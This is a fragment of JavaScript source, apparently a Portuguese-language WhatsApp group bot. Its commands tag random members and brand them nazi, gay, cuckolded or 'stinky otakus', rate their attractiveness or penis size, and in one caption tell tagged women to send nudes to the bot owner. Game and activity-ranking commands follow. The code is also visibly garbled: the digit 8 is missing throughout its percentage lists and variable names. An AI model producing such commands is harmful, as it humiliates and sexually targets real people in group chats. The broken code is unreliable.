if(!budy.includes("@")) {
var blamention_id = sender 
}
conn.sendMessage(from, {text:` ❰ Pesquisando a sua ficha de gostoso : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await conn.sendMessage(from, {image: {url: imggostoso}, caption: `O quanto você é gostoso? 😏\n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ gostoso 😝`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break 

case 'gostosa':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if(budy.includes("@")) {
var blamention_id = menc_jid
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
conn.sendMessage(from, {text:`❰ Pesquisando a sua ficha de gostosa : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await conn.sendMessage(from, {image: {url: imggostosa}, caption: `O quanto você é gostosa? 😏\n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ gostosa 😳`, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break

case 'beijo':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque alguém que vc quer da um beijo')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você deu um beijo gostoso na(o) @${mentioned[0].split('@')[0]} 😁👉👈❤` 
await conn.sendMessage(from, {video: {url: beijocmd}, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'tapa':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá o tapa')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você Acabou de da um tapa na raba da😏 @${mentioned[0].split('@')[0]} 🔥` 
await conn.sendMessage(from, {video: {url: tapacmd}, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'chute':
case 'chutar':  
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá um chute')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você Acabou de da um chute em @${mentioned[0].split('@')[0]} 🤡` 
await conn.sendMessage(from, {video: {url: chutecmd}, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break 

case 'dogolpe':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
if (args.length < 1) return await conn.sendMessage(from, {text: 'coloca um nome'}, {quoted: info})
pkt = body.slice(9)
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
random = `${Math.floor(Math.random() * 100)}`
jpr = `*GOLPISTA ENCONTRADO👉🏻*\n\n*GOLPISTA* : *${args[0]}*\n*PORCENTAGEM DO GOLPE* : ${random}%😂\n\nEle(a) gosta de ferir sentimentos 😢`
conn.sendMessage(from, {text: jpr, mentions: mentioned})
break

case 'shipo':
teks = args.join(" ")
if(teks.length < 10) return reply('Marque uma pessoa do grupo para encontrar o par dela')
membrr = []
const suamae111 = groupMembers
const suamae211 = groupMembers
const teupai111 = suamae111[Math.floor(Math.random() * suamae111.length)]
const teupai211 = suamae211[Math.floor(Math.random() * suamae211.length)]
var shipted1 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shiptedd = shipted1[Math.floor(Math.random() * shipted1.length)]
jet = `*Hmmm.... Eu Shipo eles 2💘💘*\n\n1 = @${teupai111.id.split('@')[0]}\n && 2 = ${teks} com uma porcentagem de: ${shiptedd}`
membrr.push(teupai111.id)
membrr.push(teupai211.id)
mentions(jet, membrr, true)
break

case 'casal':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
membr = []
const suamae11 = groupMembers
const suamae21 = groupMembers
const teupai11 = suamae11[Math.floor(Math.random() * suamae11.length)]
const teupai21 = suamae21[Math.floor(Math.random() * suamae21.length)]
var shipted1 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shipted = shipted1[Math.floor(Math.random() * shipted1.length)]
jet = `*Hmmm.... Eu Shipo eles 2💘💘*\n\n1= @${teupai11.id.split('@')[0]}\ne esse\n2= @${teupai21.id.split('@')[0]}\ncom uma porcentagem de: ${shipted}`
membr.push(teupai11.id)
membr.push(teupai21.id)
mentions(jet, membr, true)
break

case 'nazista':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
rate = body.slice(9)
conn.sendMessage(from, {text: ' ❰ Pesquisando a sua ficha de nazista : '+rate+' aguarde... ❱'})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await conn.sendMessage(from, {image: {url: imgnazista}, caption: 'O quanto você é nazista? \n\n「 '+rate+' 」Você é: ❰ '+random+'% ❱  nazista 卐'}, {quoted: info})
}, 7000)
break 

case 'inativos':  
if (!isGroup) return reply(enviar.msg.grupo)
if(groupIdscount.indexOf(from) < 0) return reply('O bot não tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if(countMessage[ind].numbers.length < 3) return reply('Necessita do registro de 3 usuarios')
if(countMessage[ind].numbers[indnum].messages == 2570) {
countMessage[ind].numbers.sort((a, b) => (a.messages < b.messages) ? -1 : -1)
mentioned_jid = []
boardi = '🔥፝⃟    Ranking dos membros mais inativos do grupo :\n\n'
try {
for (let i = 0; i < groupMembers.length; i++) {
if (i) boardi += `${i}º 🥇 : @${countMessage[ind].numbers[i].id.split('@')[0]}\nMensagens: ${countMessage[ind].numbers[i].messages}\nComandos dados: ${countMessage[ind].numbers[i].cmd_messages}\n\n`
mentioned_jid.push(countMessage[ind].numbers[i].id)
} 
mentions(boardi, mentioned_jid, true)
} catch (err) {
console.log(err)
await conn.sendMessage(from, {text: `A`}, {quoted: info})
}
}
break

case 'rankativo':
case 'rankativos':  
var ind = groupIdscount.indexOf(from)
if(countMessage[ind].numbers.length < 6) return reply('Necessita do registro de 5 usuarios')
bule = [];
bule2 = []
mentioned_jid = []
groupMembers2 = []
for (a of groupMembers)groupMembers2.push(a.id)
for(cag of countMessage[ind].numbers){
bule2.push(cag.id)
if(groupMembers2.includes(cag.id)){
if(cag.messages >= 100){bule.push(cag)}}}
bule.sort((a, b) => ((a.messages + a.cmd_messages) < (b.cmd_messages + b.messages)) ? 0 : -1)
boardi = 'Rank dos mais Ativos do Grupo:\n\n'
if(bule.length == 0)boardi += 'Sem Ativos'
for (let i = 0 ; i < 5; i++) {
if (i != null) boardi += `${i + 1}º : @${bule[i].id.split('@')[0]}\nMensagens: ${bule[i].messages}\nComandos dados: ${bule[i].cmd_messages}\n\n`
mentioned_jid.push(bule[i].id)
} 
mentions(boardi, mentioned_jid, true)
break

case 'rankinativo':
case 'rankinativos':  
var ind = groupIdscount.indexOf(from)
if(countMessage[ind].numbers.length < 6) return reply('Necessita do registro de 6 usuarios')
bule = [];
bule2 = []
mentioned_jid = []
groupMembers2 = []
for (a of groupMembers)groupMembers2.push(a.id)
for(cag of countMessage[ind].numbers){
bule2.push(cag.id)
if(groupMembers2.includes(cag.id)){
if(cag.messages <= 1){bule.push(cag)}}}
bule.sort((a, b) => ((a.messages + a.cmd_messages) < (b.cmd_messages + b.messages)) ? 0 : -1)
boardi = 'Rank dos mais Ghosts do Grupo:\n\n'
if(bule.length == 0)boardi += 'Sem Ghosts'
for (let i = 0 ; i < bule.length; i++) {
if (i != null) boardi += `${i + 1}º : @${bule[i].id.split('@')[0]}\nMensagens: ${bule[i].messages}\nComandos dados: ${bule[i].cmd_messages}\n\n`
mentioned_jid.push(bule[i].id)
} 
mentions(boardi, mentioned_jid, true)
break

case 'checkativo':
if (!isGroup) return reply(enviar.msg.grupo)
if(groupIdscount.indexOf(from) < 0) return reply('O bot não tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque o número que deseja puxar a atividade')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(numbersIds.indexOf(mentioned[0]) >= 0) {
var indnum = numbersIds.indexOf(mentioned[0])
mentions(`𖣘⃟ᗒ Consulta das atividade de\n𖣘⃟ᗒ @${mentioned[0].split('@')[0]} no grupo\n𖣘⃟ᗒ Mensagens: ${countMessage[ind].numbers[indnum].messages}\n𖣘⃟ᗒ Comandos dados: ${countMessage[ind].numbers[indnum].cmd_messages}`, mentioned, true)
} else {
mentions(`⋆⃟ۣۜ᭪➣ Consulta da atividade de ⋆⃟ۣۜ᭪➣ @${mentioned[0].split('@')[0]} no grupo\n⋆⃟ۣۜ᭪➣ Mensagens: 0\n⋆⃟ۣۜ᭪➣ Comandos dados: 0`, mentioned, true)
}
break

case 'ranklevel':
case 'rl':
case 'rank':
_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
let leaderboardlvl = '    🏆《 Rank Niveis 》🏆\n\n'
let nom = 0
try {
for (let i = 0; i < 10; i++) {
nom++
leaderboardlvl += `
┏ ✘🌖 ${setting.NomeDoBot} 🌘✘┓
┃•────•───────•───•
┣❲🏆❳ [${nom}] ϟ➠ ${_level[i].id.replace('@s.whatsapp.net', '')}
┣❲🏆❳「xp」: ϟ${_level[i].xp}
┣❲🏆❳「Level」 :ϟ➠ ${_level[i].level}
┗ ──────「★」──────┚\n`

}
leaderboardlvl += `×•-•-•⟮ 🏆Ranking Level🏆⟯•-•-•×`
conn.sendMessage(from, {text: leaderboardlvl, sendEphemeral: true}, {quoted: selo})
} catch (err) {
console.error(err)
await reply(`Deve conter 10 pessoas com level, e o leveling deve está ativado para que aconteça a evolução de level dos membros, após as interações`)
}
break

case 'rankgay':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
try{
d = []
ret = '🏳️‍🌈 Rank dos mais gays\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
ret += `🏳️‍🌈❧ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(ret, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankgado':
case 'rankgados':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
try{
d = []
ret = '🐂🐂 Rank dos mais gados do grupo \n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
ret += `🐂❧ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(ret, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankcorno':
case 'rankcornos':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
membr = []
const corno1 = groupMembers
const corno2 = groupMembers
const corno3 = groupMembers
const corno4 = groupMembers
const corno5 = groupMembers
const cornos1 = corno1[Math.floor(Math.random() * corno1.length)]
const cornos2 = corno2[Math.floor(Math.random() * corno2.length)]
const cornos3 = corno3[Math.floor(Math.random() * corno3.length)]
const cornos4 = corno4[Math.floor(Math.random() * corno4.length)]
const cornos5 = corno5[Math.floor(Math.random() * corno5.length)]
var porcentagemcorno = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `O chifre desse ai bate na lua ksksksk`]
const porcentagemc = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcentag = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcent = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcl = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porg = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const prg = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
ytb = `
Esses são os cornos do grupo ${groupName}\n@${cornos1.id.split('@')[0]}\nCom uma porcentagem de ${porcent}\n@${cornos2.id.split('@')[0]}\nCom uma porcentagem de ${porcentag}\n@${cornos3.id.split('@')[0]}\nCom uma porcentagem de ${porcl}\n@${cornos4.id.split('@')[0]}\nCom uma porcentagem de ${porg}\n@${cornos5.id.split('@')[0]}\nCom uma porcentagem de ${prg}\n\n⚡ ${setting.NomeDoBot} ⚡`
membr.push(cornos1.id)
membr.push(cornos2.id)
membr.push(cornos3.id)
membr.push(cornos4.id)
membr.push(cornos5.id)
mentions(ytb, membr, true)
break

case 'rankgostosos':
case 'rankgostoso':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
member = []
const p01 = groupMembers
const p02 = groupMembers
const p03 = groupMembers
const p04 = groupMembers
const p05 = groupMembers
const o01 = p01[Math.floor(Math.random() * p01.length)]
const o02 = p02[Math.floor(Math.random() * p02.length)]
const o03 = p03[Math.floor(Math.random() * p03.length)]
const o04 = p04[Math.floor(Math.random() * p04.length)]
const o05 = p05[Math.floor(Math.random() * p05.length)]
luy = `
Parados!🤚🤚\n\n1=🤚🤭@${o01.id.split('@')[0]}🤚🤭\n\n\n2=🤚🤭@${o02.id.split('@')[0]}🤚🤭\n\n\n3=🤚🤭@${o03.id.split('@')[0]}🤚🤭\n\n\n4=🤚🤭@${o04.id.split('@')[0]}🤚🤭\n\n\n5=🤚🤭@${o05.id.split('@')[0]}🤚🤭\n\n\nMulta por serem gostosos dms😳 pague pena trabalhando em nossa agência de modelos 😊 by: ${NomeDoBot}`
member.push(o01.id)
member.push(o02.id)
member.push(o03.id)
member.push(o04.id)
member.push(o05.id)
mentions(luy, member, true)
break

case 'rankgostosas':
case 'rankgostosa':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
member = []
const p1 = groupMembers
const p2 = groupMembers
const p3 = groupMembers
const p4 = groupMembers
const p5 = groupMembers
const o1 = p1[Math.floor(Math.random() * p1.length)]
const o2 = p2[Math.floor(Math.random() * p2.length)]
const o3 = p3[Math.floor(Math.random() * p3.length)]
const o4 = p4[Math.floor(Math.random() * p4.length)]
const o5 = p5[Math.floor(Math.random() * p5.length)]
luy = `
Paradas!🤚🤚\n\n1=🤚🤭@${o1.id.split('@')[0]}🤚🤭\n\n\n2=🤚🤭@${o2.id.split('@')[0]}🤚🤭\n\n\n3=🤚🤭@${o3.id.split('@')[0]}🤚🤭\n\n\n4=🤚🤭@${o4.id.split('@')[0]}🤚🤭\n\n\n5=🤚🤭@${o5.id.split('@')[0]}🤚🤭\n\n\nMultas por serem gostosas dms😳 pague pena enviando nud no PV do dono😊 by Bot`
member.push(o1.id)
member.push(o2.id)
member.push(o3.id)
member.push(o4.id)
member.push(o5.id)
mentions(luy, member, true)
break

case 'ranknazista':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
try{
if(!isGroup) return reply(enviar.msg.grupo)
d = []
teks = '💂‍♂️Rank dos mais nazistas do gp\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `💂‍♂️❧ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankotakus':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
membr = []
const otaku1 = groupMembers
const otaku2 = groupMembers
const otaku3 = groupMembers
const otaku4 = groupMembers
const otaku5 = groupMembers
const otaku6 = groupMembers
const otaku7 = groupMembers
const otaku = groupMembers
const otaku9 = groupMembers
const otaku10 = groupMembers
const otakus1 = otaku1[Math.floor(Math.random() * otaku1.length)]
const otakus2 = otaku2[Math.floor(Math.random() * otaku2.length)]
const otakus3 = otaku3[Math.floor(Math.random() * otaku3.length)]
const otakus4 = otaku4[Math.floor(Math.random() * otaku4.length)]
const otakus5 = otaku5[Math.floor(Math.random() * otaku5.length)]
const otakus6 = otaku6[Math.floor(Math.random() * otaku6.length)]
const otakus7 = otaku7[Math.floor(Math.random() * otaku7.length)]
const otakus = otaku[Math.floor(Math.random() * otaku.length)]
const otakus9 = otaku9[Math.floor(Math.random() * otaku9.length)]
const otakus10 = otaku10[Math.floor(Math.random() * otaku10.length)]
ytb = `esses são os otakus fedidos do grupo\n@${otakus1.id.split('@')[0]}\n@${otakus2.id.split('@')[0]}\n@${otakus3.id.split('@')[0]}\n@${otakus4.id.split('@')[0]}\n@${otakus5.id.split('@')[0]}\n@${otakus6.id.split('@')[0]}\n@${otakus7.id.split('@')[0]}\n@${otakus.id.split('@')[0]}\n@${otakus9.id.split('@')[0]}\n@${otakus10.id.split('@')[0]}\n\n⚡ ${setting.NomeDoBot} ⚡`
membr.push(otakus1.id)
membr.push(otakus2.id)
membr.push(otakus3.id)
membr.push(otakus4.id)
membr.push(otakus5.id)
membr.push(otakus6.id)
membr.push(otakus7.id)
membr.push(otakus.id)
membr.push(otakus9.id)
membr.push(otakus10.id)
mentions(ytb, membr, true)
break

case 'rankpau':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite ${prefix}modobrincadeira 1`)
membr = []
const pauz1 = groupMembers
const pauz2 = groupMembers
const pauz3 = groupMembers
const pauz4 = groupMembers
const pauz5 = groupMembers
const paus1 = pauz1[Math.floor(Math.random() * pauz1.length)]
const paus2 = pauz2[Math.floor(Math.random() * pauz2.length)]
const paus3 = pauz3[Math.floor(Math.random() * pauz3.length)]
const paus4 = pauz4[Math.floor(Math.random() * pauz4.length)]
const paus5 = pauz5[Math.floor(Math.random() * pauz5.length)]
var pcpau1 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau2 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau3 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau4 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau5 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
const pc1 = pcpau1[Math.floor(Math.random() * pcpau1.length)]
const pc2 = pcpau2[Math.floor(Math.random() * pcpau2.length)]
const pc3 = pcpau3[Math.floor(Math.random() * pcpau3.length)]
const pc4 = pcpau4[Math.floor(Math.random() * pcpau4.length)]
const pc5 = pcpau5[Math.floor(Math.random() * pcpau5.length)]
pdr = `Esses são os caras com o menor e maior pau do Grupo\n${groupName}\n\n@${paus1.id.split('@')[0]}\n${pc1}\n@${paus2.id.split('@')[0]}\n${pc2}\n@${paus3.id.split('@')[0]}\n${pc3}\n@${paus4.id.split('@')[0]}\n${pc4}\n@${paus5.id.split('@')[0]}\n${pc5}\n\n ${setting.NomeDoBot}`
membr.push(paus1.id)
membr.push(paus2.id)
membr.push(paus3.id)
membr.push(paus4.id)
membr.push(paus5.id)
mentions(pdr, membr, true)
break 

case 'jogodavelha':
if(!isGroup) return reply('comando apenas para grupos')
joguinhodavelhajs.push(sender)
fs.writeFileSync('./datab/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.push(from)
fs.writeFileSync('./datab/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
if (fs.existsSync(`./armor/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
     
[❗] Alguém está jogando no momento...\n\n@${boardnow.X} VS @${boardnow.O}
     
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
     
 Sua vez : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
     
${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
conn.sendMessage(from, {text: chatMove}, {quoted: info,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return reply(`*⟅❗⟆ Jogue com Alguem!!!!*
*para inicar a partida : ${prefix + command} @membro do gp*`);
const boardnow = setGame(`${from}`);
console.log(`Start No jogodavelha ${boardnow.session}`);
boardnow.status = false;
boardnow.X = sender.replace("@s.whatsapp.net", "");
boardnow.O = argss[1].replace("@", "");
var blabord = [`${boardnow.X}`, `${boardnow.O}`]
fs.writeFileSync(`./armor/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const strChat = `*『📌ᎬՏᏢᎬᎡᎪΝᎠϴ ϴ ϴᏢϴΝᎬΝͲᎬ⚔️』*
     
@${sender.replace("@s.whatsapp.net",
"")} _está te desafiando para uma partida de jogo da velha..._
_[ ${argss[1]} ] Use *『S』* para aceitar ou *『N』* para não aceitar..._
     `;
conn.sendMessage(from, {text: strChat, mentions: [blabord]}, {quoted: info});
break

case 'resetarvelha':
case 'resetavelha':  
case 'resetarv':
case 'resetav': 
case 'resetvelha':
case 'rv': 
if (!isJoguin && !isGroupAdmins) return reply(`Fale com quem iniciou o jogo, só ele pode resetar, ou então algum ADM`)
if (fs.existsSync("./armor/tictactoe/db/" + from + ".json")) {
fs.unlinkSync("./armor/tictactoe/db/" + from + ".json");
reply(`Jogo da velha resetado com sucesso nesse grupo!`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
reply(`Não a nenhuma sessão em andamento...`);
}
break

case "ppt":
if (args.length < 1) return reply(`Você deve digitar ${prefix}ppt pedra, ${prefix}ppt papel ou ${prefix}ppt tesoura`)
ppt = ["pedra", "papel", "tesoura"]
ppy = ppt[Math.floor(Math.random() * ppt.length)]
ppg = Math.floor(Math.random() * 1) + 10
pptb = ppy
if ((pptb == "pedra" && args == "papel") ||
(pptb == "papel" && args == "tesoura") ||
(pptb == "tesoura" && args == "pedra")) {
var vit = "vitoria"
} else if ((pptb == "pedra" && args == "tesoura") ||
(pptb == "papel" && args == "pedra") ||
(pptb == "tesoura" && args == "papel")) {
var vit = "derrota"
} else if ((pptb == "pedra" && args == "pedra") ||
(pptb == "papel" && args == "papel") ||
(pptb == "tesoura" && args == "tesoura")) {
var vit = "empate"
} else if (vit = "undefined") {
return reply(`Você deve digitar ${prefix}ppt pedra, ${prefix}ppt papel ou ${prefix}ppt tesoura`)
}
if (vit == "vitoria") {
var tes = "Vitória do jogador"
}
if (vit == "derrota") {
var tes = "A vitória é do BOT"
}
if (vit == "empate") {
var tes = "O jogo terminou em empate"
}
reply(`${NomeDoBot} jogou: ${pptb}\nO jogador jogou: ${args}\n\n${tes}`)
if (tes == "Vitória do jogador") {
reply(pph)
}
break

case 'cassino':
addFilter(from)  
const soto = [
'🍊 : 🍒 : 🍐',
'🍒 : 🔔 : 🍊',
'🍇 : 🍇 : 🍇',
'🍊 : 🍋 : 🔔',
'🔔 : 🍒 : 🍐',
'🔔 : 🍒 : 🍊',
'🍊 : 🍋 : ??',		
'🍐 : 🍒 : 🍋',
'🍐 : 🍐 : 🍐',
'🍊 : 🍒 : 🍒',
